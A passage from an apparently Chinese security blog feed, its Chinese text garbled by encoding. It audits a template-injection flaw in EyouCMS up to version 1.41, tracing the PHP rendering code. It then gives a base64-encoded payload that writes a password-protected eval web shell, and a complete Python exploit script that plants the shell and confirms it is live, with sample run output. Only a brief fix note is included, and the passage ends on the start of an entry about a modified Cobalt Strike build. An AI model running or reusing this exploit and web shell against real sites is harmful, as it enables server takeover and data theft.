å°†$attarrayä¸­çš„å®ä½“å­—ç¬¦è½¬æ¢ä¸ºæ­£å¸¸å­—ç¬¦<br>9 Line: å°†$attarrayè¿›è¡Œbase64è§£ç å†jsonè§£ç <br>12 Line: å®šä¹‰æ ‡ç­¾<br>13~18 Line: ä½¿ç”¨foreachå°†$attayä»¥é”®å€¼å¯¹çš„æ–¹å¼éå†å‡ºæ¥ï¼Œåˆ¤æ–­æ¯ä¸€ä¸ªå…ƒç´ æ˜¯å¦ä¸ºjså¦‚æœæ˜¯é‚£ä¹ˆç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯ï¼Œå¦åˆ™â€œ{$key}&#x3D;â€™{$val}â€™â€è¿æ¥åˆ°æ ‡ç­¾åé¢<br>19 Line: é—­åˆç¬¬ä¸€ä¸ªæ ‡ç­¾<br>20 Line: å°†$htmlcodeæ‹¼æ¥åˆ°æ ‡ç­¾åï¼Œä½œä¸ºå†…å®¹ä½¿ç”¨<br>21 Line: å°†é—­åˆæ ‡ç­¾æ‹¼æ¥åˆ°$innertextä¸­<br>23 Line: è°ƒç”¨åŸºç±»ä¸­çš„displayæ–¹æ³•å¹¶å°†$innertextä¼ å…¥</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/Controll.php</code>æ–‡ä»¶ä¸­çš„**<code>display</code>**æ–¹æ³•</p><pre><code class="php">protected function display($content = &#39;&#39;, $vars = [], $replace = [], $config = [])&#123;    return $this-&gt;view-&gt;display($content, $vars, $replace, $config);&#125;</code></pre><p>3 Line: è°ƒç”¨è§†å›¾ç±»ä¸­çš„displayæ–¹æ³•ï¼Œå¹¶å°†$contentã€$varsã€$replaceã€$configä¼ å…¥</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/View.php</code>æ–‡ä»¶ä¸­çš„**<code>display</code>**æ–¹æ³•</p><pre><code class="php">public function display($content, $vars = [], $replace = [], $config = [])&#123;    return $this-&gt;fetch($content, $vars, $replace, $config, true);&#125;</code></pre><p>3 Line: è°ƒç”¨å½“å‰ç±»ä¸­çš„fetchæ–¹æ³•å¹¶å°†å¹¶å°†$contentã€$varsã€$replaceã€$configä¼ å…¥</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/View.php</code>æ–‡ä»¶ä¸­çš„**<code>fetch</code>**æ–¹æ³•</p><pre><code class="php">public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false)&#123;    // æ¨¡æ¿å˜é‡    $vars = array_merge(self::$var, $this-&gt;data, $vars);    // é¡µé¢ç¼“å­˜    ob_start();    ob_implicit_flush(0);    // æ¸²æŸ“è¾“å‡º    try &#123;        $method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;        // å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ¨¡æ¿çš„å­—ç¬¦ä¸²æ›¿æ¢        // $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));        $replace = array_merge($this-&gt;replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;), $replace); // è§£å†³ä¸€ä¸ªé¡µé¢ä¸Šè°ƒç”¨å¤šä¸ªé’©å­çš„å†²çªé—®é¢˜ by å°è™å“¥        /*æ’ä»¶æ¨¡æ¿å­—ç¬¦ä¸²æ›¿æ¢ï¼Œä¸èƒ½æ”¾åœ¨æ„é€ å‡½æ•°ï¼Œæ¯•ç«Ÿæ„é€ å‡½æ•°åªæ‰§è¡Œä¸€æ¬¡ by å°è™å“¥*/        // if ($this-&gt;__isset(&#39;weappInfo&#39;)) &#123;        //     $weappInfo = $this-&gt;__get(&#39;weappInfo&#39;);        //     if (!empty($weappInfo[&#39;code&#39;])) &#123;        //         $replace[&#39;__WEAPP_TEMPLATE__&#39;] = ROOT_DIR.&#39;/&#39;.WEAPP_DIR_NAME.&#39;/&#39;.$weappInfo[&#39;code&#39;].&#39;/template&#39;;        //     &#125;        // &#125;        /*--end*/        $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);        $this-&gt;engine-&gt;$method($template, $vars, $config);    &#125; catch (\Exception $e) &#123;        ob_end_clean();        throw $e;    &#125;    // è·å–å¹¶æ¸…ç©ºç¼“å­˜    $content = ob_get_clean();    // å†…å®¹è¿‡æ»¤æ ‡ç­¾    Hook::listen(&#39;view_filter&#39;, $content);    // $this-&gt;checkcopyr($content);    return $content;&#125;</code></pre><p>4 Line: å°†å½“å‰ç±»ä¸­çš„æˆå‘˜å±æ€§$varã€$dataä»¥åŠä¼ å…¥çš„$varsåˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„å¹¶èµ‹ç»™$vars<br>7~8 Line: å¼€å¯é¡µé¢ç¼“å­˜<br>11 Line: ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦åˆ¤æ–­å¤–éƒ¨ä¼ å…¥çš„$renderContentæ˜¯å¦ä¸ºçœŸï¼Œè‹¥ä¸ºçœŸé‚£ä¹ˆå°†displayèµ‹å€¼ç»™$methodï¼Œå¦åˆ™å°†fetchèµ‹å€¼ç»™$method<br>24 Line: è°ƒç”¨Thinkç±»ä¸­çš„$methodæ–¹æ³•å¹¶å°†$templateã€$varsã€$configä¼ å…¥</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/view/driver/Think.php</code>ä¸­çš„**<code>display</code>**æ–¹æ³•</p><pre><code class="php">public function display($template, $data = [], $config = [])&#123;    $this-&gt;template-&gt;display($template, $data, $config);&#125;</code></pre><p>3 Line: è°ƒç”¨æ¨¡æ¿ç±»ä¸­çš„displayæ–¹æ³•å¹¶å°†$templateã€$dataã€$configä¼ å…¥</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/Template.php</code>ä¸­çš„**<code>display</code>**æ–¹æ³•</p><pre><code class="php">public function display($content, $vars = [], $config = [])&#123;    if ($vars) &#123;        $this-&gt;data = $vars;    &#125;    if ($config) &#123;        $this-&gt;config($config);    &#125;    $cacheFile = $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($content) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);    if (!$this-&gt;checkCache($cacheFile)) &#123;        // ç¼“å­˜æ— æ•ˆ æ¨¡æ¿ç¼–è¯‘        $this-&gt;compiler($content, $cacheFile);    &#125;    // è¯»å–ç¼–è¯‘å­˜å‚¨    $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);&#125;</code></pre><p>3<del>5 Line: åˆ¤æ–­å¤–éƒ¨ä¼ å…¥çš„$varsæ˜¯å¦æœ‰å€¼ï¼Œè‹¥æœ‰é‚£ä¹ˆåˆ™å°†$varsèµ‹å€¼ç»™å½“å‰ç±»ä¸­çš„æˆå‘˜å±æ€§dataä¸­<br>6</del>8 Line: åˆ¤æ–­$configæ˜¯å¦æœ‰å€¼ï¼Œè‹¥æœ‰é‚£ä¹ˆå°†$configä¼ å…¥å½“å‰ç±»ä¸­çš„configæ–¹æ³•<br>9 Line: ç”Ÿæˆç¼“å­˜æ–‡ä»¶åç§°èµ‹å€¼ç»™$cacheFile<br>10~13 Line: åˆ¤æ–­æ˜¯å¦æ²¡æœ‰$cacheFileè¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œä¸ºçœŸåˆ™è°ƒç”¨å½“å‰ç±»ä¸­çš„compileræ–¹æ³•å¹¶ä¸”å°†$contentåŠ$cacheFileä¼ å…¥å…¶ä¸­</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/Template.php</code>ä¸­çš„**<code>compiler</code>**æ–¹æ³•</p><pre><code class="php">private function compiler(&amp;$content, $cacheFile)&#123;    // åˆ¤æ–­æ˜¯å¦å¯ç”¨å¸ƒå±€    if ($this-&gt;config[&#39;layout_on&#39;]) &#123;        if (false !== strpos($content, &#39;&#123;__NOLAYOUT__&#125;&#39;)) &#123;            // å¯ä»¥å•ç‹¬å®šä¹‰ä¸ä½¿ç”¨å¸ƒå±€            $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);        &#125; else &#123;            // è¯»å–å¸ƒå±€æ¨¡æ¿            $layoutFile = $this-&gt;parseTemplateFile($this-&gt;config[&#39;layout_name&#39;]);            if (is_array($layoutFile)) &#123; // å¼•å…¥æ¨¡æ¿çš„é”™è¯¯å‹å¥½æç¤º by å°è™å“¥                $content = !empty($layoutFile[&#39;msg&#39;]) ? $layoutFile[&#39;msg&#39;] : $content;            &#125; else if ($layoutFile) &#123;                // æ›¿æ¢å¸ƒå±€çš„ä¸»ä½“å†…å®¹                $content = str_replace($this-&gt;config[&#39;layout_item&#39;], $content, file_get_contents($layoutFile));            &#125;        &#125;    &#125; else &#123;        $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);    &#125;    // æ¨¡æ¿è§£æ    $this-&gt;parse($content);    if ($this-&gt;config[&#39;strip_space&#39;]) &#123;        /* å»é™¤htmlç©ºæ ¼ä¸æ¢è¡Œ */        $find    = [&#39;~&gt;\s+&lt;~&#39;, &#39;~&gt;(\s+\n|\r)~&#39;];        $replace = [&#39;&gt;&lt;&#39;, &#39;&gt;&#39;];        $content = preg_replace($find, $replace, $content);    &#125;    // ä¼˜åŒ–ç”Ÿæˆçš„phpä»£ç     $content = preg_replace(&#39;/\?&gt;\s*&lt;\?php\s(?!echo\b)/s&#39;, &#39;&#39;, $content);    // æ¨¡æ¿è¿‡æ»¤è¾“å‡º    $replace = $this-&gt;config[&#39;tpl_replace_string&#39;];    $content = str_replace(array_keys($replace), array_values($replace), $content);    // æ·»åŠ å®‰å…¨ä»£ç åŠæ¨¡æ¿å¼•ç”¨è®°å½•    $content = &#39;&lt;?php if (!defined(\&#39;THINK_PATH\&#39;)) exit(); /*&#39; . serialize($this-&gt;includeFile) . &#39;*/ ?&gt;&#39; . &quot;\n&quot; . $content;    // ç¼–è¯‘å­˜å‚¨    $this-&gt;storage-&gt;write($cacheFile, $content);    $this-&gt;includeFile = [];    return;&#125;</code></pre><p>23 Line: å°†å¤–éƒ¨ä¼ å…¥çš„$contentä¼ åˆ°å½“å‰ç±»ä¸­çš„parseï¼ˆè§£ææ¨¡æ¿ï¼‰æ–¹æ³•ä¸­</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/Template.php</code>ä¸­çš„**<code>parse</code>**æ–¹æ³•</p><pre><code class="php">public function parse(&amp;$content)&#123;    // å†…å®¹ä¸ºç©ºä¸è§£æ    if (empty($content)) &#123;        return;    &#125;    // æ›¿æ¢eyou:literalæ ‡ç­¾å†…å®¹    $this-&gt;parseEyouLiteral($content);    // æ›¿æ¢literalæ ‡ç­¾å†…å®¹    $this-&gt;parseLiteral($content);    // è§£æç»§æ‰¿    $this-&gt;parseExtend($content);    // è§£æå¸ƒå±€    $this-&gt;parseLayout($content);    // æ£€æŸ¥eyou:includeè¯­æ³•  by å°è™å“¥    $this-&gt;parseEyouInclude($content);    // æ£€æŸ¥includeè¯­æ³•    $this-&gt;parseInclude($content);    // æ›¿æ¢åŒ…å«æ–‡ä»¶ä¸­literalæ ‡ç­¾å†…å®¹    $this-&gt;parseLiteral($content);    // æ›¿æ¢åŒ…å«æ–‡ä»¶ä¸­eyou:literalæ ‡ç­¾å†…å®¹    $this-&gt;parseEyouLiteral($content);    // æ£€æŸ¥PHPè¯­æ³•    $this-&gt;parsePhp($content);    // è·å–éœ€è¦å¼•å…¥çš„æ ‡ç­¾åº“åˆ—è¡¨    // æ ‡ç­¾åº“åªéœ€è¦å®šä¹‰ä¸€æ¬¡ï¼Œå…è®¸å¼•å…¥å¤šä¸ªä¸€æ¬¡    // ä¸€èˆ¬æ”¾åœ¨æ–‡ä»¶çš„æœ€å‰é¢    // æ ¼å¼ï¼š&lt;taglib name=&quot;html,mytag...&quot; /&gt;    // å½“TAGLIB_LOADé…ç½®ä¸ºtrueæ—¶æ‰ä¼šè¿›è¡Œæ£€æµ‹    if ($this-&gt;config[&#39;taglib_load&#39;]) &#123;        $tagLibs = $this-&gt;getIncludeTagLib($content);        if (!empty($tagLibs)) &#123;            // å¯¹å¯¼å…¥çš„TagLibè¿›è¡Œè§£æ            foreach ($tagLibs as $tagLibName) &#123;                $this-&gt;parseTagLib($tagLibName, $content);            &#125;        &#125;    &#125;    // é¢„å…ˆåŠ è½½çš„æ ‡ç­¾åº“ æ— éœ€åœ¨æ¯ä¸ªæ¨¡æ¿ä¸­ä½¿ç”¨taglibæ ‡ç­¾åŠ è½½ ä½†å¿…é¡»ä½¿ç”¨æ ‡ç­¾åº“XMLå‰ç¼€    if ($this-&gt;config[&#39;taglib_pre_load&#39;]) &#123;        $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_pre_load&#39;]);        foreach ($tagLibs as $tag) &#123;            $this-&gt;parseTagLib($tag, $content);        &#125;    &#125;    // å†…ç½®æ ‡ç­¾åº“ æ— éœ€ä½¿ç”¨taglibæ ‡ç­¾å¯¼å…¥å°±å¯ä»¥ä½¿ç”¨ å¹¶ä¸”ä¸éœ€ä½¿ç”¨æ ‡ç­¾åº“XMLå‰ç¼€    $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_build_in&#39;]);    foreach ($tagLibs as $tag) &#123;        $this-&gt;parseTagLib($tag, $content, true);    &#125;    // è§£ææ™®é€šæ¨¡æ¿æ ‡ç­¾ &#123;$tagName&#125;    $this-&gt;parseTag($content);    // è¿˜åŸè¢«æ›¿æ¢çš„eyou:Literalæ ‡ç­¾    $this-&gt;parseEyouLiteral($content, true);    // è¿˜åŸè¢«æ›¿æ¢çš„Literalæ ‡ç­¾    $this-&gt;parseLiteral($content, true);    return;&#125;</code></pre><p>24 Line: è°ƒç”¨å½“å‰ç±»ä¸­çš„parsePhpï¼ˆè§£æphpæ ‡ç­¾ï¼‰æ–¹æ³•å¹¶å°†$contentä¼ å…¥</p><p>è·Ÿè¸ªåˆ°<code>/core/library/think/Template.php</code>ä¸­çš„**<code>parsePhp</code>**æ–¹æ³•</p><pre><code class="php">private function parsePhp(&amp;$content)&#123;    // çŸ­æ ‡ç­¾çš„æƒ…å†µè¦å°†&lt;?æ ‡ç­¾ç”¨echoæ–¹å¼è¾“å‡º å¦åˆ™æ— æ³•æ­£å¸¸è¾“å‡ºxmlæ ‡è¯†    $content = preg_replace(&#39;/(&lt;\?(?!php|=|$))/i&#39;, &#39;&lt;?php echo \&#39;\\1\&#39;; ?&gt;&#39; . &quot;\n&quot;, $content);    // è¿‡æ»¤evalå‡½æ•°ï¼Œé˜²æ­¢è¢«æ³¨å…¥æ‰§è¡Œä»»æ„ä»£ç  by å°è™å“¥    $view_replace_str = config(&#39;view_replace_str&#39;);    if (isset($view_replace_str[&#39;__EVAL__&#39;])) &#123;        if (stristr($content, &#39;&#123;eyou:php&#125;&#39;)) &#123; // é’ˆå¯¹&#123;eyou:php&#125;æ ‡ç­¾è¯­æ³•å¤„ç†            preg_match_all(&#39;/&#123;eyou\:php&#125;.*&#123;\/eyou\:php&#125;/iUs&#39;, $content, $matchs);            $matchs = !empty($matchs[0]) ? $matchs[0] : [];            if (!empty($matchs)) &#123;                foreach($matchs as $key =&gt; $val)&#123;                    $valNew = preg_replace(&#39;/&#123;(\/)?eyou\:php&#125;/i&#39;, &#39;&#39;, $val);                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = &quot;&#123;eyou:php&#125;&#123;$valNew&#125;&#123;/eyou:php&#125;&quot;;                    $content = str_ireplace($val, $valNew, $content);                &#125;            &#125;        &#125; else if (stristr($content, &#39;&#123;php&#125;&#39;)) &#123; // é’ˆå¯¹&#123;php&#125;æ ‡ç­¾è¯­æ³•å¤„ç†            preg_match_all(&#39;/&#123;php&#125;.*&#123;\/php&#125;/iUs&#39;, $content, $matchs);            $matchs = !empty($matchs[0]) ? $matchs[0] : [];            if (!empty($matchs)) &#123;                foreach($matchs as $key =&gt; $val)&#123;                    $valNew = preg_replace(&#39;/&#123;(\/)?php&#125;/i&#39;, &#39;&#39;, $val);                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = &quot;&#123;php&#125;&#123;$valNew&#125;&#123;/php&#125;&quot;;                    $content = str_ireplace($val, $valNew, $content);                &#125;            &#125;        &#125; else if (false !== strpos($content, &#39;&lt;?php&#39;)) &#123; // é’ˆå¯¹åŸç”Ÿphpè¯­æ³•å¤„ç†            $content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, &#39;intval(&#39;, $content);            $this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;ï¼Ÿï½ï½•ï½ï½&quot;, $content);        &#125;    &#125;    // end    // PHPè¯­æ³•æ£€æŸ¥    if ($this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; false !== strpos($content, &#39;&lt;?php&#39;)) &#123;        if (config(&#39;app_debug&#39;)) &#123; // è°ƒè¯•æ¨¡å¼ä¸‹ä¸­æ–­æ¨¡æ¿æ¸²æŸ“ by å°è™å“¥            throw new Exception(&#39;not allow php tag&#39;, 11600);        &#125; else &#123; // è¿è¥æ¨¡å¼ä¸‹ç»§ç»­æ¨¡æ¿æ¸²æŸ“ by å°è™å“¥            echo(lang(&#39;not allow php tag&#39;));        &#125;    &#125;    return;&#125;</code></pre><p>4 Line: å°†æ¨¡æ¿ä¸­phpçŸ­æ ‡ç­¾è½¬æ¢ä¸º<?php echo â€˜1â€™?></p><p>21 Line: åˆ¤æ–­ä¼ å…¥çš„$contentä¸­æ˜¯å¦åŒ…å«äº†{php}</p><p>22 Line: ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å‡º$contentä¸­æ‰€æœ‰åŒ…å«äº†â€œ{php}ä»»æ„å†…å®¹{&#x2F;php}â€çš„æ ‡ç­¾</p><p>23 Line: ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦åˆ¤æ–­åŒ¹é…å‡ºæ¥çš„æ•°ç»„ä¸­çš„ç¬¬0ä¸ªå…ƒç´ æ˜¯å¦æœ‰å€¼ï¼Œå¦‚æœæœ‰å€¼é‚£ä¹ˆå°†ç¬¬0ä¸ªå…ƒç´ çš„å€¼èµ‹ç»™$matchså¦åˆ™å°†ç©ºæ•°ç»„èµ‹ç»™$matchs</p><p>24 Line: åˆ¤æ–­$matchsä¸ä¸ºç©º</p><p>25 Line: å°†$matchsä½¿ç”¨foreachå¾ªç¯éå†</p><p>26 Line: å°†$valä¸­çš„â€œ{&#x2F;ä»»æ„ç©ºç™½å­—ç¬¦php}â€æ›¿æ¢ä¸ºç©ºå¹¶èµ‹ç»™$valnew</p><p>27 Line: å°†$valnewä¸­çš„â€œå¤šä¸ªæˆ–é›¶ä¸ª0-9A-Za-Z_eval(â€æ›¿æ¢ä¸ºâ€œintval(â€</p><p>28 Line: å°†$valnewä¸­çš„â€œå¼€å§‹ä¸ºevalä»»æ„ç©ºç™½å­—ç¬¦(â€æ›¿æ¢ä¸ºâ€œintval(â€</p><p>29 Line: å°†å­—ç¬¦ä¸²â€œ{php}{$valNew}{&#x2F;php}â€èµ‹ç»™$valnew</p><p>30 Line: å°†$contentä¸­çš„$valæ›¿æ¢ä¸º$valNew</p><h3 id="0x04-æ¼æ´æ¢æµ‹"><a href="#0x04-æ¼æ´æ¢æµ‹" class="headerlink" title="0x04 æ¼æ´æ¢æµ‹"></a>0x04 æ¼æ´æ¢æµ‹</h3><pre><code>Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&amp;html=&#123;php&#125;phpinfo();&#123;/php&#125;</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8xGqLF.png" alt="8xGqLF.png"></p><h3 id="0x05-æ¼æ´å¤ç°"><a href="#0x05-æ¼æ´å¤ç°" class="headerlink" title="0x05 æ¼æ´å¤ç°"></a>0x05 æ¼æ´å¤ç°</h3><p>Payloadç”Ÿæˆæ–¹å¼:</p><pre><code>base64_encode(jsonstring)</code></pre><p>evalä¼šè¢«æ›¿æ¢æˆintvalï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨base64åŠ å¯†å†™å…¥webshellçš„æ–¹å¼<br>phpä»£ç å¦‚ä¸‹ï¼š</p><pre><code>file_put_contents(&quot;./wait.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==&quot;));</code></pre><p>PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs&#x2F;Pg&#x3D;&#x3D;å†…å®¹ï¼š</p><pre><code>&lt;?php eval($_REQUEST[â€œwâ€]);?&gt;</code></pre><p>å°†phpæ ‡ç­¾è½¬æ¢ä¸ºjsonæ ¼å¼å¹¶åŠ å¯†ï¼š</p><pre><code class="php">print base64_encode(json_encode(array(&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;=&gt;&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;)));eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=</code></pre><p>pyload:</p><pre><code>attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&amp;htmlcode=bb</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8xJJFs.png" alt="8xJJFs.png"></p><p>htmlcodeå‚æ•°ä½œä¸ºéšæœºæ–¹å¼ä¼ é€’</p><h3 id="0x06-æ¼æ´ä¿®å¤"><a href="#0x06-æ¼æ´ä¿®å¤" class="headerlink" title="0x06 æ¼æ´ä¿®å¤"></a>0x06 æ¼æ´ä¿®å¤</h3><p>å¯ä»¥ä½¿ç”¨assignæ–¹æ³•æ¥å°†æ ‡ç­¾ç›´æ¥æ›¿æ¢æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œè€Œä¸æ˜¯å°†æ ‡ç­¾ä¼ å…¥displayæ–¹æ³•ä¸­å°†æ ‡ç­¾ç›´æ¥ç¼–è¯‘ï¼Œå±é™©æ€§å¤§å¤§æå‡</p><h3 id="0x07-è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬"><a href="#0x07-è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬" class="headerlink" title="0x07 è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬"></a>0x07 è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬</h3><pre><code class="console">silly@PenetrationOs:~#: python eyoucms-ssti.py -u http://192.168.1.106:8085/ -o abc[+] æ­£åœ¨è¯·æ±‚ç›®æ ‡åœ°å€:http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist ç›®æ ‡åœ°å€http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlistå­˜æ´»[+] æ­£åœ¨å‘ç›®æ ‡åœ°å€http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlistå†™å…¥abc.php ç–‘ä¼¼æˆåŠŸå†™å…¥Webshell[+] æ­£åœ¨æ¢æµ‹Webshell(http://192.168.1.106:8085/abc.php)æ˜¯å¦å­˜æ´» Webshell(http://192.168.1.106:8085/abc.php)å·²å­˜æ´» å¯†ç ï¼šceshi</code></pre><pre><code>#!/usr/bin/python -*- coding: UTF-8 -*-import requestsimport sys,getoptimport json,base64import timeclass Eyoucms:    session = None    headers = None    password = &quot;ceshi&quot;    output = &quot;ceshi&quot;    requesturi = &quot;/?m=api&amp;c=ajax&amp;a=get_tag_memberlist&quot;    def __init__(self,headers):        self.headers = headers        self.getparam(sys.argv[1:])        self.requestsdata = &#123;            &quot;attarray&quot;:self.createpyload(),            &quot;htmlcode&quot;:time.time()        &#125;        self.run()    def getparam(self,argv):        try:            options, args = getopt.getopt(argv, &quot;h:u:p:o:&quot;, [&quot;help&quot;, &quot;url=&quot;,&quot;password=&quot;,&quot;output=&quot;])        except getopt.GetoptError:            print &#39;eyoucms-ssti.py -u url -p password -o outputfile&#39;            return        for option, value in options:            if option in (&quot;-h&quot;, &quot;--help&quot;):                print &#39;eyoucms-ssti.py -u url&#39;            if option in (&quot;-u&quot;, &quot;--url&quot;):                if(self.request(value).status_code != 404):                    self.url = value            if option in (&quot;-p&quot;, &quot;--password&quot;):                    if(value != None):                        self.password = value                    else:                        self.password = &quot;ceshi&quot;            if option in (&quot;-o&quot;, &quot;--output&quot;):                    if(value != None):                        self.output = value.replace(&quot;.php&quot;,&quot;&quot;)                    else:                        self.output = &quot;ceshi&quot;    def run(self):        url = self.url.rstrip(&#39;/&#39;)+self.requesturi        print &quot;[+] æ­£åœ¨è¯·æ±‚ç›®æ ‡åœ°å€:%s&quot;%(url)        if(self.request(url).status_code == 200):            print &quot; ç›®æ ‡åœ°å€%så­˜æ´»&quot;%url        else:            print &quot;[-] ç›®æ ‡åœ°å€%sæ¢æµ‹å¤±è´¥&quot;%url            return        print &quot;[+] æ­£åœ¨å‘ç›®æ ‡åœ°å€%så†™å…¥%s.php&quot;%(url,self.output)        if(self.request(url,&quot;post&quot;).status_code == 200):            print &quot; ç–‘ä¼¼æˆåŠŸå†™å…¥Webshell&quot;        shell = self.url.rstrip(&#39;/&#39;)+&quot;/%s.php&quot;%self.output        print &quot;[+] æ­£åœ¨æ¢æµ‹Webshell(%s)æ˜¯å¦å­˜æ´»&quot;%(shell)        if(self.request(shell).status_code == 200):            print &quot; Webshell(%s)å·²å­˜æ´»\n å¯†ç ï¼š%s&quot;%(shell,self.password)    def createpyload(self):        short = base64.b64encode(&quot;&lt;php eval($_REQUEST[%s]);?&gt;&quot;%self.password)        file = self.output        payload = &#123;            &quot;&#123;php&#125;1&#123;/php&#125;&quot;:&quot;&#123;php&#125;file_put_contents(&#39;./%s.php&#39;,base64_decode(&#39;%s&#39;));&#123;/php&#125;&quot;%(file,short)        &#125;        return base64.b64encode(json.dumps(payload))    def request(self,url,method=&quot;get&quot;):        respone = None        if(not self.session):            self.session = requests.Session()        if(method == &quot;get&quot;):            try:                respone = self.session.get(url=url,headers=self.headers)            except requests.exceptions.ConnectTimeout:                print &quot;[-] è¯·æ±‚%sè¶…æ—¶&quot;%url                return            except requests.exceptions.ConnectionError:                print &quot;[-] è¯·æ±‚%sæ— æ•ˆ&quot;%url                return            return respone        elif(method == &quot;post&quot;):            try:                respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers)            except requests.exceptions.ConnectTimeout:                print &quot;[-] è¯·æ±‚%sè¶…æ—¶&quot;%url                return            except requests.exceptions.ConnectionError:                print &quot;[-] è¯·æ±‚%sæ— æ•ˆ&quot;%url                return        return respone   if __name__ == &quot;__main__&quot;:    headers = &#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;    &#125;    Eyoucms(headers)</code></pre><p>###æ¼æ´å½±å“èŒƒå›´<br>  EyouCMS&lt;&#x3D;1.41</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªåˆ¶CS 4.0 å»æš—æ¡©/VNCä¿®å¤/x64Payloadä¿®å¤/ç»ˆææ±‰åŒ–ç‰ˆæœ¬</title>
      <link href="/2020/03/21/%E8%87%AA%E5%88%B6CS-4-0-%E5%8E%BB%E6%9A%97%E6%A1%A9-VNC%E4%BF%AE%E5%A4%8D-x64Payload%E4%BF%AE%E5%A4%8D-%E7%BB%88%E6%9E%81%E6%B1%89%E5%8C%96%E7%89%88%E6%9C%AC/"/>
